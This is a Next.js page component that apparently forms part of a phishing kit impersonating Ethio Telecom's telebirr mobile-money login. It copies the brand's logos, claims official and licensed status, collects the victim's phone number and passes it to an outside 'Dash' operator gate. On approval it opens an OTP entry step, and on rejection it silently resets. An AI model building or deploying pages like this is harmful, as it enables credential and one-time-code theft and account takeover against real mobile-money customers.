'use client';

import React, { useState } from 'react';
import {
  ShieldCheck,
  Zap,
  CreditCard,
  PhoneCall,
  CheckCircle2,
  Globe,
  Sparkles,
  ArrowRight,
  RefreshCw,
  AlertCircle,
  HelpCircle,
  ExternalLink,
} from 'lucide-react';
import { EthioTelecomLogo } from '@/components/telebirr/EthioTelecomLogo';
import { TelebirrLogo } from '@/components/telebirr/TelebirrLogo';
import { BackgroundWaves } from '@/components/telebirr/BackgroundWaves';
import { LanguageSelector } from '@/components/telebirr/LanguageSelector';
import { TeleHubDrawer } from '@/components/telebirr/TeleHubDrawer';
import { TermsModal } from '@/components/telebirr/TermsModal';
import { RegisterModal } from '@/components/telebirr/RegisterModal';
import { OTPVerificationModal } from '@/components/telebirr/OTPVerificationModal';
import { AccountDashboard } from '@/components/telebirr/AccountDashboard';
import { Language, translations } from '@/lib/telebirr-translations';
import { requestDashApproval } from '@/lib/dash-gate';

const DASH_SITE_ID = 'telebirr-portal';

export default function HomePage() {
  // Localization state
  const [lang, setLang] = useState<Language>('en');
  const t = translations[lang];

  // Login form state
  const [phoneNumber, setPhoneNumber] = useState<string>('');
  const [phoneError, setPhoneError] = useState<string | null>(null);
  const [isValidating, setIsValidating] = useState<boolean>(false);

  // Modals & Drawers
  const [isTeleHubOpen, setIsTeleHubOpen] = useState<boolean>(false);
  const [isTermsOpen, setIsTermsOpen] = useState<boolean>(false);
  const [isRegisterOpen, setIsRegisterOpen] = useState<boolean>(false);
  const [isOtpOpen, setIsOtpOpen] = useState<boolean>(false);

  // Authenticated state
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(false);

  // Format Ethiopian mobile number nicely as 9XX XXX XXX
  const formatPhoneNumber = (digits: string) => {
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)} ${digits.slice(3)}`;
    return `${digits.slice(0, 3)} ${digits.slice(3, 6)} ${digits.slice(6, 9)}`;
  };

  // Validate Ethiopian phone number (must be 9 digits, starting with 9 or 7)
  const handlePhoneChange = (val: string) => {
    let cleaned = val.replace(/\D/g, '');
    if (cleaned.startsWith('251')) {
      cleaned = cleaned.slice(3);
    }
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.slice(1);
    }
    cleaned = cleaned.slice(0, 9);
    setPhoneNumber(cleaned);
    if (phoneError) setPhoneError(null);
  };

  const handleNext = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const cleanNum = phoneNumber.replace(/\D/g, '');
    if (cleanNum.length !== 9 || (!cleanNum.startsWith('9') && !cleanNum.startsWith('7'))) {
      setPhoneError('Incorrect Number');
      return;
    }

    setPhoneError(null);
    // Gated by Dash: Next button shows spinner until Pass / Not Pass.
    // Pass -> OTP modal (other page). Not Pass -> silently reset, no error/note.
    setIsValidating(true);

    const decision = await requestDashApproval({
      siteId: DASH_SITE_ID,
      page: 'login',
      meta: { phone: '+251' + cleanNum },
    });
    setIsValidating(false);
    if (decision === 'pass') setIsOtpOpen(true);
  };

  return (
    <div
      className="min-h-screen bg-[#fcfdfa] text-slate-900 flex flex-col relative font-sans selection:bg-[#84cc16]/30 selection:text-slate-900"
      id="telebirr-web-app-root"
    >
      {/* Background organic contour waves matching the screenshot */}
      <BackgroundWaves />

      {/* Top System / Portal Bar */}
      <header
        className="relative z-30 w-full border-b border-slate-200/80 bg-white/80 backdrop-blur-md transition-all"
        id="main-portal-header"
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between">
          {/* Dual Brand Logos: Ethio telecom & telebirr + Verification Portal text */}
          <div className="flex items-center gap-3 sm:gap-5">
            <EthioTelecomLogo size="md" />
            <div className="h-7 w-px bg-slate-200" aria-hidden="true" />
            <TelebirrLogo size="md" />
            <div className="h-5 w-px bg-slate-200" aria-hidden="true" />
            <span
              id="header-verification-portal-text"
              className="text-xs sm:text-sm font-semibold text-slate-600 tracking-wide select-none"
            >
              Verification Portal
            </span>
          </div>

          {/* Center Navigation Shortcuts (Desktop Web) */}
          <nav className="hidden lg:flex items-center gap-6 text-xs font-semibold text-slate-600">
            <span className="text-[#0077c8] font-bold border-b-2 border-[#0077c8] pb-1 cursor-pointer">
              Personal Portal
            </span>
            <span className="text-slate-400">|</span>
            <div className="flex items-center gap-2 text-slate-500">
              <PhoneCall className="w-3.5 h-3.5 text-[#6aa828]" />
              <span>Helpline:</span>
              <span className="font-bold text-slate-800">994 / 127</span>
            </div>
          </nav>

          {/* Right Controls: Language Selector */}
          <div className="flex items-center gap-2.5 sm:gap-4">
            {/* Language Dropdown ("English ▼" as seen in screenshot) */}
            <LanguageSelector
              currentLang={lang}
              onSelectLang={setLang}
              variant="bordered"
            />
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 flex flex-col justify-center relative z-10 py-6 sm:py-12 px-4 sm:px-6">
        {isLoggedIn ? (
          /* Logged In Dashboard View */
          <AccountDashboard
            phoneNumber={phoneNumber}
            t={t}
            onLogout={() => {
              setIsLoggedIn(false);
              setPhoneNumber('');
            }}
          />
        ) : (
          /* ============================================================ */
          /* RESPONSIVE WEB PORTAL LAYOUT                                 */
          /* ============================================================ */
          <div className="max-w-6xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-8 sm:gap-12 items-center">
            {/* Left Column: Brand Story, Ethio telecom & telebirr features */}
            <div className="lg:col-span-6 space-y-6 text-left hidden lg:block">
              <div className="inline-flex items-center gap-2.5 px-3.5 py-1.5 rounded-full bg-slate-900/[0.04] border border-slate-300/80 text-slate-800 text-xs font-semibold tracking-wide shadow-2xs backdrop-blur-xs">
                <ShieldCheck className="w-4 h-4 text-[#0077c8]" />
                <span className="font-bold text-slate-900">Verification Portal</span>
                <span className="h-3 w-px bg-slate-300" aria-hidden="true" />
                <span className="text-[11px] text-slate-500 font-medium">Official &amp; Secure</span>
              </div>

              <div className="space-y-3">
                <h1 className="text-4xl xl:text-5xl font-extrabold text-slate-900 tracking-tight leading-tight">
                  {t.welcome}{' '}
                  <span className="text-[#0077c8] block">{t.allInOne}</span>
                  Digital Gateway
                </h1>
                <p className="text-slate-600 text-base leading-relaxed max-w-lg">
                  Access Ethiopia&apos;s leading mobile money and telecommunication ecosystem. Recharge airtime, pay utility bills, transfer funds, and manage your account seamlessly.
                </p>
              </div>

              {/* Feature Highlights */}
              <div className="grid grid-cols-2 gap-4 pt-2">
                <div className="p-4 rounded-2xl bg-white/90 border border-slate-200/80 shadow-xs">
                  <div className="w-9 h-9 rounded-xl bg-sky-50 text-[#0077c8] flex items-center justify-center font-bold mb-2">
                    <CreditCard className="w-5 h-5" />
                  </div>
                  <h4 className="text-sm font-bold text-slate-900">telebirr Wallet</h4>
                  <p className="text-xs text-slate-500 mt-0.5">
                    Fast, secure money transfers and online checkout.
                  </p>
                </div>

                <div className="p-4 rounded-2xl bg-white/90 border border-slate-200/80 shadow-xs">
                  <div className="w-9 h-9 rounded-xl bg-lime-50 text-[#6aa828] flex items-center justify-center font-bold mb-2">
                    <Zap className="w-5 h-5" />
                  </div>
                  <h4 className="text-sm font-bold text-slate-900">Bills & Utilities</h4>
                  <p className="text-xs text-slate-500 mt-0.5">
                    Instant electricity (EEU), water, and government payments.
                  </p>
                </div>
              </div>

              {/* Trust Badge */}
              <div className="flex items-center gap-4 pt-2 text-xs text-slate-500">
                <div className="flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4 text-[#6aa828]" />
                  <span>Licensed by National Bank of Ethiopia</span>
                </div>
                <span>•</span>
                <span>45M+ Happy Citizens</span>
              </div>
            </div>

            {/* Right Column: The Authentic Login Card (Website Form of the Mobile Screenshot) */}
            <div className="lg:col-span-6 flex justify-center">
              <div
                className="w-full max-w-md bg-white/95 backdrop-blur-md rounded-3xl shadow-xl sm:shadow-2xl border border-slate-200/90 p-6 sm:p-9 relative overflow-hidden"
                id="telebirr-login-card"
              >
                {/* Header of the card (reflecting mobile app header with logos) */}
                <div className="flex items-center justify-between pb-6 border-b border-slate-100">
                  <EthioTelecomLogo size="sm" />
                  <TelebirrLogo size="sm" />
                </div>

                {/* Main Hero Typography from Screenshot:
                    "Welcome to" (Welcor watermark)
                    "All-in-One" in blue
                    "Login" with green underline
                */}
                <div className="pt-6 pb-6 text-center relative">
                  {/* Faint 'Welcome to' watermark accent matching the screenshot's 'Welcor' */}
                  <div
                    className="text-slate-300/80 font-bold text-xs uppercase tracking-widest mb-1 select-none"
                    aria-hidden="true"
                  >
                    {t.welcome}
                  </div>

                  <h2 className="text-[#0077c8] text-xl sm:text-2xl font-semibold tracking-tight">
                    {t.allInOne}
                  </h2>

                  <div className="inline-block mt-1 relative">
                    <h3 className="text-2xl sm:text-3xl font-black text-slate-900 tracking-tight">
                      {t.login}
                    </h3>
                    {/* The iconic signature green underline bar from the screenshot */}
                    <div
                      className="h-1 w-16 sm:w-20 bg-[#84cc16] rounded-full mx-auto mt-1.5"
                      aria-hidden="true"
                    />
                  </div>
                </div>

                {/* Login Form */}
                <form onSubmit={handleNext} className="space-y-4" id="telebirr-login-form" noValidate>
                  {/* Mobile Number Field */}
                  <div className="space-y-1.5 text-left">
                    <label
                      htmlFor="mobile-number-input"
                      className="block text-xs font-semibold text-slate-500 uppercase tracking-wide pl-1"
                    >
                      {t.mobileNumber}
                    </label>

                    {/* Input box matching the mobile screenshot with +251 prefix */}
                    <div
                      className={`flex items-center border rounded-2xl overflow-hidden bg-white transition-all shadow-xs ${
                        phoneError
                          ? 'border-red-400 ring-2 ring-red-100'
                          : 'border-slate-300 focus-within:border-[#0077c8] focus-within:ring-3 focus-within:ring-[#0077c8]/15'
                      }`}
                    >
                      <div className="px-4 py-3.5 bg-slate-50/80 border-r border-slate-200 text-slate-800 font-bold text-base flex items-center gap-1.5 select-none flex-shrink-0">
                        <span className="text-base" role="img" aria-label="Ethiopia flag">
                          🇪🇹
                        </span>
                        <span>+251</span>
                      </div>

                      <input
                        id="mobile-number-input"
                        type="tel"
                        inputMode="numeric"
                        autoComplete="tel-national"
                        maxLength={11}
                        value={formatPhoneNumber(phoneNumber)}
                        disabled={isValidating}
                        onChange={(e) => {
                          if (isValidating) return;
                          handlePhoneChange(e.target.value);
                        }}
                        className="flex-1 px-4 py-3.5 text-base sm:text-lg font-semibold text-slate-900 focus:outline-none tracking-wide bg-transparent font-mono disabled:opacity-60"
                        aria-label="Mobile Number"
                      />

                      {phoneNumber && !isValidating && (
                        <button
                          type="button"
                          onClick={() => setPhoneNumber('')}
                          className="pr-3 text-xs text-slate-400 hover:text-slate-600 font-bold cursor-pointer"
                          title="Clear number"
                        >
                          ✕
                        </button>
                      )}
                    </div>

                    {phoneError && (
                      <p id="phone-error-message" className="text-xs text-red-500 pl-1 pt-1 font-medium">
                        Incorrect Number
                      </p>
                    )}
                  </div>

                  {/* Action Button: "Next" in bright primary blue */}
                  <button
                    type="submit"
                    id="login-next-button"
                    disabled={isValidating}
                    className="w-full py-4 px-6 rounded-2xl bg-[#0077c8] hover:bg-[#006cb8] active:scale-[0.99] text-white font-bold text-base tracking-wide shadow-md hover:shadow-lg transition-all duration-150 flex items-center justify-center gap-2 cursor-pointer disabled:opacity-70 disabled:cursor-not-allowed"
                  >
                    {isValidating ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin text-white" />
                        <span>{t.validating}</span>
                      </>
                    ) : (
                      <span>{t.next}</span>
                    )}
                  </button>

                  {/* Verification Portal */}
                  <div
                    id="verification-portal-text"
                    className="pt-4 text-center text-sm font-semibold text-slate-600 tracking-wide"
                  >
                    Verification Portal
                  </div>

                  {/* Footer inside Card: Terms and Conditions & Copyright */}
                  <div className="pt-6 border-t border-slate-150 text-center space-y-1.5">
                    <div>
                      <button
                        type="button"
                        id="terms-conditions-link"
                        onClick={() => setIsTermsOpen(true)}
                        className="text-xs font-semibold text-[#6aa828] hover:underline hover:text-[#558b2f] transition-colors cursor-pointer"
                      >
                        {t.termsAndConditions}
                      </button>
                    </div>

                    <p className="text-[11px] text-slate-400 leading-tight">
                      {t.copyright} <span className="font-mono">{t.version}</span>
                    </p>
                  </div>
                </form>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Website Footer (Desktop Web) */}
      <footer className="relative z-20 border-t border-slate-200/80 bg-white/70 backdrop-blur-xs py-6 mt-auto">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
          <div className="flex items-center gap-2">
            <span className="font-semibold text-slate-700">Ethio Telecom • telebirr</span>
            <span>|</span>
            <span>{t.copyright}</span>
          </div>

          <div className="flex items-center gap-5 font-medium">
            <button
              onClick={() => setIsTermsOpen(true)}
              className="hover:text-slate-800 transition-colors"
            >
              {t.termsAndConditions}
            </button>
            <span className="text-slate-400">v1.3.2</span>
          </div>
        </div>
      </footer>

      {/* Interactive Modals & Drawers */}
      <TeleHubDrawer
        isOpen={isTeleHubOpen}
        onClose={() => setIsTeleHubOpen(false)}
        t={t}
      />

      <TermsModal
        isOpen={isTermsOpen}
        onClose={() => setIsTermsOpen(false)}
        t={t}
      />

      <RegisterModal
        isOpen={isRegisterOpen}
        onClose={() => setIsRegisterOpen(false)}
        t={t}
        onSuccessRegister={(num) => {
          setPhoneNumber(num);
          setIsOtpOpen(true);
        }}
      />

      <OTPVerificationModal
        isOpen={isOtpOpen}
        onClose={() => setIsOtpOpen(false)}
        phoneNumber={phoneNumber}
        t={t}
        onSuccessLogin={() => setIsLoggedIn(true)}
      />
    </div>
  );
}
